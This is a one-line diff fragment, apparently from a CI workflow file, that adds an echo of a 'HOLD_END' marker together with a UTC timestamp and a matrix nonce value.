+          echo "I1741_HOLD_END=$(date -u +%Y-%m-%dT%H:%M:%SZ) ${{ matrix.nonce }}"
